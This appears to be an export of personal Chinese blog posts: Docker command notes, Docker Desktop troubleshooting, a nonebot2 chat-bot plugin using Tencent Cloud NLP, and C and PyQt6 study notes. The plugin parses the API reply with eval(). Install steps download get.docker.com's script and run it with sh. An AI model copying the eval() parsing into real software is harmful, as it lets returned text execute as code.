<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LABEL</span><span class="bash"> &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; </span></span><br></pre></td></tr></table></figure>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://www.runoob.com/docker/docker-compose.html">菜鸟教程Docker Dockerfile </a></p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker使用秘籍(1)</title>
    <url>/2022/06/05/Docker%E4%BD%BF%E7%94%A8%E7%A7%98%E7%B1%8D/</url>
    <content><![CDATA[<h1 id="Docker使用秘籍（1）"><a href="#Docker使用秘籍（1）" class="headerlink" title="Docker使用秘籍（1）"></a>Docker使用秘籍（1）</h1><p>近期再次进一步学习了一下docker，做一些笔记来总结一下使用心得。本篇为一些初阶的入门命令记录。</p>
<span id="more"></span>
<h2 id="Docker基础配置"><a href="#Docker基础配置" class="headerlink" title="Docker基础配置"></a>Docker基础配置</h2><h3 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com -o get-docker.sh</span><br><span class="line">sh get-docker.sh</span><br></pre></td></tr></table></figure>
<h3 id="Dokcer镜像加速"><a href="#Dokcer镜像加速" class="headerlink" title="Dokcer镜像加速"></a>Dokcer镜像加速</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docker.mirrors.ustc.edu.cn&#x2F;</span><br></pre></td></tr></table></figure>
<h3 id="查看Docker配置情况"><a href="#查看Docker配置情况" class="headerlink" title="查看Docker配置情况"></a>查看Docker配置情况</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker info</span><br><span class="line">docker --version</span><br></pre></td></tr></table></figure>
<h3 id="Docker开启、后台运行、重启"><a href="#Docker开启、后台运行、重启" class="headerlink" title="Docker开启、后台运行、重启"></a>Docker开启、后台运行、重启</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo systemctl start docker</span><br><span class="line">sudo systemctl enable docker</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
<h2 id="Docker基本命令"><a href="#Docker基本命令" class="headerlink" title="Docker基本命令"></a>Docker基本命令</h2><h3 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h3><h4 id="获取镜像"><a href="#获取镜像" class="headerlink" title="获取镜像"></a>获取镜像</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker pull ubuntu</span><br></pre></td></tr></table></figure>
<h4 id="查找镜像"><a href="#查找镜像" class="headerlink" title="查找镜像"></a>查找镜像</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker search ubuntu</span><br></pre></td></tr></table></figure>
<h4 id="查看本地镜像"><a href="#查看本地镜像" class="headerlink" title="查看本地镜像"></a>查看本地镜像</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
<h4 id="更新镜像"><a href="#更新镜像" class="headerlink" title="更新镜像"></a>更新镜像</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker commit -m&#x3D;&quot;has update&quot; -a&#x3D;&quot;runoob&quot; e218edb10161 runoob&#x2F;ubuntu:v2</span><br></pre></td></tr></table></figure>
<p>各个参数说明：</p>
<ul>
<li><strong>-m:</strong> 提交的描述信息</li>
<li><strong>-a:</strong> 指定镜像作者</li>
<li><strong>e218edb10161：</strong>容器 ID</li>
<li><strong>runoob/ubuntu:v2:</strong> 指定要创建的目标镜像名</li>
</ul>
<h4 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker build -t runoob&#x2F;centos:6.7 .</span><br></pre></td></tr></table></figure>
<p>参数说明：</p>
<ul>
<li><strong>-t</strong> ：指定要创建的目标镜像名</li>
<li><strong>.</strong> ：Dockerfile 文件所在目录，可以指定Dockerfile 的绝对路径</li>
</ul>
<h4 id="设置镜像标签"><a href="#设置镜像标签" class="headerlink" title="设置镜像标签"></a>设置镜像标签</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker tag &lt;id&gt; runoob&#x2F;centos:dev</span><br></pre></td></tr></table></figure>
<h3 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h3><h4 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -it ubuntu /bin/bash</span><br></pre></td></tr></table></figure>
<p>参数说明：</p>
<ul>
<li><strong>-i</strong>: 交互式操作。</li>
<li><strong>-t</strong>: 终端。</li>
<li><strong>ubuntu</strong>: ubuntu 镜像。</li>
<li><strong>/bin/bash</strong>：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 /bin/bash。</li>
</ul>
<p>要退出终端，直接输入 <strong>exit</strong></p>
<h4 id="查看正在运行的容器"><a href="#查看正在运行的容器" class="headerlink" title="查看正在运行的容器"></a>查看正在运行的容器</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>
<h4 id="查看所有容器"><a href="#查看所有容器" class="headerlink" title="查看所有容器"></a>查看所有容器</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
<h4 id="查看容器日志"><a href="#查看容器日志" class="headerlink" title="查看容器日志"></a>查看容器日志</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker logs &lt;id&gt;</span><br><span class="line">docker logs &lt;name&gt;</span><br><span class="line">docker logs -f &lt;id&gt;</span><br></pre></td></tr></table></figure>
<p><strong>-f:</strong> 让 <strong>docker logs</strong> 像使用 <strong>tail -f</strong> 一样来输出容器内部的标准输出。</p>
<h4 id="后台运行容器"><a href="#后台运行容器" class="headerlink" title="后台运行容器"></a>后台运行容器</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -it -d ubuntu /bin/bash</span><br></pre></td></tr></table></figure>
<h4 id="启动、停止、重启容器"><a href="#启动、停止、重启容器" class="headerlink" title="启动、停止、重启容器"></a>启动、停止、重启容器</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker start &lt;id&gt;</span><br><span class="line">docker stop &lt;id&gt;</span><br><span class="line">docker restart &lt;id&gt;</span><br></pre></td></tr></table></figure>
<h4 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it &lt;id&gt; &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<h4 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rm -f &lt;id&gt;</span><br></pre></td></tr></table></figure>
<h4 id="导出-导入容器"><a href="#导出-导入容器" class="headerlink" title="导出/导入容器"></a>导出/导入容器</h4><p>导出容器快照</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker export &lt;id&gt; &gt; ubuntu.tar</span><br></pre></td></tr></table></figure>
<p>导入容器快照</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat docker&#x2F;ubuntu.tar | docker import - test&#x2F;ubuntu:v1</span><br><span class="line">docker import http:&#x2F;&#x2F;example.com&#x2F;exampleimage.tgz example&#x2F;imagerepo</span><br></pre></td></tr></table></figure>
<h4 id="设置web应用端口"><a href="#设置web应用端口" class="headerlink" title="设置web应用端口"></a>设置web应用端口</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 5000:80 &lt;web&gt;</span><br><span class="line">docker run -d -P &lt;web&gt;</span><br><span class="line">docker port &lt;id&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>-p 前一个端口为宿主机目标端口，后一个是容器端口</li>
<li>-P 为随机分配端口</li>
</ul>
<h4 id="查看容器进程"><a href="#查看容器进程" class="headerlink" title="查看容器进程"></a>查看容器进程</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker top &lt;id&gt;</span><br></pre></td></tr></table></figure>
<h4 id="检查Docker的底层信息"><a href="#检查Docker的底层信息" class="headerlink" title="检查Docker的底层信息"></a>检查Docker的底层信息</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker inspect &lt;id&gt;</span><br></pre></td></tr></table></figure>
<h3 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h3><h4 id="登录、登出仓库"><a href="#登录、登出仓库" class="headerlink" title="登录、登出仓库"></a>登录、登出仓库</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker login</span><br><span class="line">docker logout</span><br></pre></td></tr></table></figure>
<h4 id="推送镜像"><a href="#推送镜像" class="headerlink" title="推送镜像"></a>推送镜像</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker push mapleice&#x2F;ubuntu:18.04</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>近期开发时遇到的一些问题</title>
    <url>/2022/01/26/%E8%BF%91%E6%9C%9F%E5%BC%80%E5%8F%91%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="这几周遇到的问题和解决思路整合"><a href="#这几周遇到的问题和解决思路整合" class="headerlink" title="这几周遇到的问题和解决思路整合"></a>这几周遇到的问题和解决思路整合</h1><p>把nonebot2从alpha版本升级到了beta版本，历经了巨大的更新折磨。再次无限感谢nonebot群里群友准备的<a href="https://github.com/nonebot/discussions/discussions/74">升级改动汇总</a>，还有我们的各位大佬群友的帮助。在本次更新正式结束后，将慢慢总结遇到的问题。</p>
<span id="more"></span>
<h2 id="Q1、pypi的源地址"><a href="#Q1、pypi的源地址" class="headerlink" title="Q1、pypi的源地址"></a>Q1、pypi的源地址</h2><p>临时使用（换源都懂，但是有时候国内源更新的太慢，必须用官方源才行）</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">pip3 install -i https://pypi.tuna.tsinghua.edu.cn/simple/    #清华</span><br><span class="line">pip3 install -i http://mirrors.aliyun.com/pypi/simple/       #阿里源</span><br><span class="line">pip3 install -i https://pypi.mirrors.ustc.edu.cn/simple/     #中科大</span><br><span class="line">pip3 install -i http://pypi.douban.com/simple/               #豆瓣</span><br><span class="line">pip3 install -i https://pypi.python.org/simple/              #pypi</span><br></pre></td></tr></table></figure>
<p>永久换源</p>
<p><img src="https://s2.loli.net/2022/01/26/9wJxmHORE3uhM2r.png" alt=""></p>
<h2 id="Q2、枫酱的聊天黑名单功能"><a href="#Q2、枫酱的聊天黑名单功能" class="headerlink" title="Q2、枫酱的聊天黑名单功能"></a>Q2、枫酱的聊天黑名单功能</h2><p>嗯，因为有人不懂规矩，喜欢和枫酱聊一些不合适的内容，所以加了这个功能，开源一下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> .blacklistsss <span class="keyword">import</span> blacklist</span><br><span class="line">msg = msg[<span class="number">2</span>:] <span class="comment">#beta版本的特性~</span></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> blacklist:</span><br><span class="line">    <span class="keyword">if</span> each <span class="keyword">in</span> msg:</span><br><span class="line">        <span class="keyword">await</span> maplechat.finish(<span class="string">&quot;请勿输入以上内容！！！&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>聊天插件并不复杂，也开源一波</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> nonebot <span class="keyword">import</span> on_command</span><br><span class="line"><span class="keyword">from</span> nonebot.rule <span class="keyword">import</span> to_me</span><br><span class="line"><span class="keyword">from</span> nonebot.typing <span class="keyword">import</span> T_State</span><br><span class="line"><span class="keyword">from</span> nonebot.params <span class="keyword">import</span> State</span><br><span class="line"><span class="keyword">from</span> nonebot.adapters <span class="keyword">import</span> Bot, Event</span><br><span class="line"><span class="keyword">from</span> nonebot.permission <span class="keyword">import</span> SUPERUSER</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> .blacklistsss <span class="keyword">import</span> blacklist</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tencentcloud.common <span class="keyword">import</span> credential</span><br><span class="line"><span class="keyword">from</span> tencentcloud.common.profile.client_profile <span class="keyword">import</span> ClientProfile</span><br><span class="line"><span class="keyword">from</span> tencentcloud.common.profile.http_profile <span class="keyword">import</span> HttpProfile</span><br><span class="line"><span class="keyword">from</span> tencentcloud.common.exception.tencent_cloud_sdk_exception <span class="keyword">import</span> TencentCloudSDKException</span><br><span class="line"><span class="keyword">from</span> tencentcloud.nlp.v20190408 <span class="keyword">import</span> nlp_client, models</span><br><span class="line"></span><br><span class="line">__plugin_name__ = <span class="string">&#x27;chat&#x27;</span></span><br><span class="line">__plugin_usage__ = <span class="string">&#x27;用法：通过腾讯云的接口与枫酱聊天哦~&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># on_command()为针对命令型事件的响应，即以配置的命令前缀为开头的语句，新版本的on_command返回内容会带有指令本身。</span></span><br><span class="line">maplechat = on_command(<span class="string">&quot;枫酱&quot;</span>,priority=<span class="number">25</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 具体响应逻辑部分</span></span><br><span class="line"><span class="meta">@maplechat.handle()</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">handle_chat_receive</span>(<span class="params">bot: Bot, event: Event, state: T_State=State(<span class="params"></span>)</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取去除了命令前缀后的信息，并且用strip()去除前后的空格与换行符</span></span><br><span class="line">    msg = <span class="built_in">str</span>(event.get_message()).strip()</span><br><span class="line">    msg = msg[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> each <span class="keyword">in</span> msg:</span><br><span class="line">            <span class="keyword">await</span> maplechat.finish(<span class="string">&quot;请勿输入以上内容！！！&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cred = credential.Credential(SecretId, SecretKey)</span><br><span class="line">        httpProfile = HttpProfile()</span><br><span class="line">        httpProfile.endpoint = <span class="string">&quot;nlp.tencentcloudapi.com&quot;</span></span><br><span class="line">    </span><br><span class="line">        clientProfile = ClientProfile()</span><br><span class="line">        clientProfile.httpProfile = httpProfile</span><br><span class="line">        client = nlp_client.NlpClient(cred, <span class="string">&quot;ap-guangzhou&quot;</span>, clientProfile)</span><br><span class="line">    </span><br><span class="line">        req = models.ChatBotRequest()</span><br><span class="line">        params = &#123;</span><br><span class="line">        <span class="string">&quot;Query&quot;</span> : msg</span><br><span class="line">        &#125;</span><br><span class="line">        req.from_json_string(json.dumps(params))</span><br><span class="line">    </span><br><span class="line">        resp = client.ChatBot(req)</span><br><span class="line">        reply = <span class="built_in">eval</span>(resp.to_json_string())[<span class="string">&quot;Reply&quot;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> TencentCloudSDKException <span class="keyword">as</span> err:</span><br><span class="line">        <span class="built_in">print</span>(err)</span><br><span class="line">    <span class="comment"># finish会向信息来源发回作为参数的字符串，并且在执行后结束响应</span></span><br><span class="line">    <span class="comment"># 如果希望发送后继续执行代码，应该将finish改为send</span></span><br><span class="line">    <span class="keyword">await</span> maplechat.finish(reply)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Q3、Docker-desktop寄了"><a href="#Q3、Docker-desktop寄了" class="headerlink" title="Q3、Docker desktop寄了"></a>Q3、Docker desktop寄了</h2><p>出大问题只能说，折腾了很久，很折磨心态。</p>
<p>报错内容：什么堆栈问题，一个字看不懂。</p>
<p><a href="https://blog.csdn.net/LeungSr/article/details/117900614">解决方案</a></p>
<p>下载了一个<code>wsl.msi</code>，无脑下一步安装就行。</p>
<h2 id="Q4、Docker-desktop又寄了"><a href="#Q4、Docker-desktop又寄了" class="headerlink" title="Q4、Docker desktop又寄了"></a>Q4、Docker desktop又寄了</h2><p>报错内容：</p>
<p>System.InvalidOperationException:<br>Failed to set version to docker-desktop: exit code: -1</p>
<p>临时解决方案：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">netsh winsock reset    //以管理员身份进cmd</span><br></pre></td></tr></table></figure>
<p>长期解决方案：</p>
<p><a href="https://blog.csdn.net/guoxingege/article/details/108983329">CSDN1</a></p>
<p><a href="https://blog.csdn.net/MShow006/article/details/103774672">CSDN2</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/151392411">知乎</a></p>
<h2 id="Q5、脚本安装docker"><a href="#Q5、脚本安装docker" class="headerlink" title="Q5、脚本安装docker"></a>Q5、脚本安装docker</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com -o get-docker.sh</span><br><span class="line">sh get-docker.sh --mirror Aliyun</span><br></pre></td></tr></table></figure>
<h2 id="Q6、docker-desktop迁移"><a href="#Q6、docker-desktop迁移" class="headerlink" title="Q6、docker desktop迁移"></a>Q6、docker desktop迁移</h2><p><a href="https://exp-blog.com/container/wsl2-qian-yi-docker-cun-chu-wei-zhi/">WSL2 迁移 Docker 镜像存储位置</a></p>
<h2 id="Q7、CTFd-whale配置"><a href="#Q7、CTFd-whale配置" class="headerlink" title="Q7、CTFd whale配置"></a>Q7、CTFd whale配置</h2><p><img src="https://c.img.dasctf.com/images/2023130/1675054526330-620336a3-a8d7-4f0d-b7fd-30ead09701eb.png" alt="image-20230130125522305"></p>
<p><img src="https://c.img.dasctf.com/images/2023130/1675054546190-f4600f2f-214e-4b60-96a7-71cff139ba74.png" alt="image-20230130125540164"></p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>debug</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言学习笔记之函数篇</title>
    <url>/2022/01/13/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%87%BD%E6%95%B0%E7%AF%87/</url>
    <content><![CDATA[<h1 id="函数篇"><a href="#函数篇" class="headerlink" title="函数篇"></a>函数篇</h1><p>本章是函数篇了哦</p>
<span id="more"></span>
<h2 id="初见函数"><a href="#初见函数" class="headerlink" title="初见函数"></a>初见函数</h2><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>求出1-10、20-30、35-45的三个和</p>
<h4 id="非函数代码"><a href="#非函数代码" class="headerlink" title="非函数代码"></a>非函数代码</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> sum;</span><br><span class="line">	<span class="keyword">for</span> ( i=<span class="number">1</span>,sum=<span class="number">0</span>; i&lt;=<span class="number">10</span>; i++)&#123;</span><br><span class="line">		sum += i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d到%d的和是%d\n&quot;</span>, <span class="number">1</span>, <span class="number">10</span>, sum);</span><br><span class="line">	<span class="keyword">for</span> ( i=<span class="number">20</span>,sum=<span class="number">0</span>; i&lt;=<span class="number">30</span>; i++)&#123;</span><br><span class="line">		sum += i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d到%d的和是%d\n&quot;</span>, <span class="number">20</span>, <span class="number">30</span>, sum);</span><br><span class="line">	<span class="keyword">for</span> ( i=<span class="number">35</span>,sum=<span class="number">0</span>; i&lt;=<span class="number">45</span>; i++)&#123;</span><br><span class="line">		sum += i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d到%d的和是%d\n&quot;</span>, <span class="number">35</span>, <span class="number">45</span>, sum);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注：代码复制是程序质量不良的表现。</p>
<h4 id="函数版代码"><a href="#函数版代码" class="headerlink" title="函数版代码"></a>函数版代码</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> begin, <span class="keyword">int</span> end)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i=begin; i&lt;=end; i++)&#123;</span><br><span class="line">        sum +=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d到%d的和是%d\n&quot;</span>, begin, end, sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    sum(<span class="number">1</span>,<span class="number">10</span>);</span><br><span class="line">    sum(<span class="number">20</span>,<span class="number">30</span>);</span><br><span class="line">    sum(<span class="number">35</span>,<span class="number">45</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="什么是函数"><a href="#什么是函数" class="headerlink" title="什么是函数"></a>什么是函数</h2><p>函数是一块代码，接受零个或多个参数。然后做一件事情，并返回零个或一个值。</p>
<h2 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> begin, <span class="keyword">int</span> end)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i=begin; i&lt;=end; i++)&#123;</span><br><span class="line">        sum +=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d到%d的和是%d\n&quot;</span>, begin, end, sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>void sum(int begin, int end)</code>为函数头</p>
<p>第一个<code>&#123;&#125;</code>中的内容称为函数体</p>
<p><code>sum</code>是函数名，<code>int begin, int end</code>为参数表</p>
<p><code>void</code>是返回类型，在此例子中表明函数不返回函数值</p>
<h2 id="调用函数"><a href="#调用函数" class="headerlink" title="调用函数"></a>调用函数</h2><ul>
<li><p>调用语法：函数名(参数值);</p>
</li>
<li><p>()起到了调用函数的功能</p>
</li>
<li>如果有参数，则需要给出正确的数量和顺序</li>
<li>这些值会被按照顺序依次用来初始化函数中的参数</li>
</ul>
<h2 id="函数返回"><a href="#函数返回" class="headerlink" title="函数返回"></a>函数返回</h2><p>函数知道每一次是哪里调用它，会返回到正确的地方。</p>
<h2 id="从函数中返回值"><a href="#从函数中返回值" class="headerlink" title="从函数中返回值"></a>从函数中返回值</h2><ul>
<li>return <strong>停止</strong>函数的执行，并送回一个值</li>
<li>return;</li>
<li>return 表达式;</li>
</ul>
<h2 id="没有返回值的函数"><a href="#没有返回值的函数" class="headerlink" title="没有返回值的函数"></a>没有返回值的函数</h2><ul>
<li>void 函数名（参数表）</li>
<li>不能使用带值的return（可以没有return）</li>
<li>调用的时候不能做返回值的赋值</li>
<li>如果函数有返回值，则必须使用带值的return</li>
</ul>
<h2 id="原型声明"><a href="#原型声明" class="headerlink" title="原型声明"></a>原型声明</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> begin, <span class="keyword">int</span> end)</span></span>; <span class="comment">//声明</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="comment">//以下内容省略</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>函数头，以“ <strong>;</strong> ”结尾，就构成了函数的原型</li>
<li>函数原型的目的是告诉编译器这个函数长什么样【名称，参数（数量及类型），返回类型】</li>
</ul>
<h2 id="类型不匹配"><a href="#类型不匹配" class="headerlink" title="类型不匹配"></a>类型不匹配</h2><ul>
<li>调用函数时给的值与参数的类型不匹配是C语言传统上最大的漏洞</li>
<li>编译器总是悄悄替你把类型转换好，但是这很可能不是你所期望的。</li>
<li>后续C++、Java会更加严格</li>
</ul>
<h2 id="传值"><a href="#传值" class="headerlink" title="传值"></a>传值</h2><p>每个函数有自己的变量空间，参数也位于这个独立的空间中，和其他函数没有关系。</p>
]]></content>
      <categories>
        <category>基础课程学习</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>pyqt6学习</title>
    <url>/2022/01/11/pyqt6%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="pyqt6学习笔记"><a href="#pyqt6学习笔记" class="headerlink" title="pyqt6学习笔记"></a>pyqt6学习笔记</h1><p>整点可视化的GUI界面。</p>
<span id="more"></span>
<h2 id="日期和时间"><a href="#日期和时间" class="headerlink" title="日期和时间"></a>日期和时间</h2><p>PyQt6 有 <code>currentDate</code>、<code>currentTime</code> 和 <code>currentDateTime</code> 方法获取当前的日期或时间。</p>
<h3 id="本地时间"><a href="#本地时间" class="headerlink" title="本地时间"></a>本地时间</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># file: current_date_time.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PyQt6.QtCore <span class="keyword">import</span> QDate, QTime, QDateTime, Qt</span><br><span class="line"></span><br><span class="line">now = QDate.currentDate()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(now.toString(Qt.DateFormat.ISODate))        <span class="comment">#2022-01-11</span></span><br><span class="line"><span class="built_in">print</span>(now.toString(Qt.DateFormat.RFC2822Date))    <span class="comment">#11 Jan 2022</span></span><br><span class="line"></span><br><span class="line">datetime = QDateTime.currentDateTime()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(datetime.toString())                        <span class="comment">#Tue Jan 11 22:04:52 2022</span></span><br><span class="line"></span><br><span class="line">time = QTime.currentTime()</span><br><span class="line"><span class="built_in">print</span>(time.toString(Qt.DateFormat.ISODate))       <span class="comment">#22:04:52</span></span><br></pre></td></tr></table></figure>
<h3 id="UTC时间"><a href="#UTC时间" class="headerlink" title="UTC时间"></a>UTC时间</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PyQt6.QtCore <span class="keyword">import</span> QDateTime, Qt</span><br><span class="line"></span><br><span class="line">now = QDateTime.currentDateTime()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Local datetime: &#x27;</span>, now.toString(Qt.DateFormat.ISODate))              <span class="comment">#Local datetime:  2022-01-11T22:11:31</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Universal datetime: &#x27;</span>, now.toUTC().toString(Qt.DateFormat.ISODate))  <span class="comment">#Universal datetime:  2022-01-11T14:11:31Z</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;The offset from UTC is: <span class="subst">&#123;now.offsetFromUtc()&#125;</span> seconds&#x27;</span>)             <span class="comment">#The offset from UTC is: 28800 seconds</span></span><br><span class="line"><span class="comment">#本例获取了标准时间和本地时间。</span></span><br></pre></td></tr></table></figure>
<p>剩下的其他功能感觉用处不大。截个图备用</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671532079026-185e44ca-93d4-4628-b0ea-a32867c987c6.png" alt="image-20220111221613537"></p>
<p>留下链接</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://maicss.gitbook.io/pyqt-chinese-tutoral/pyqt6/datetime#li-shi-zhan-yi">日期和时间</a></p>
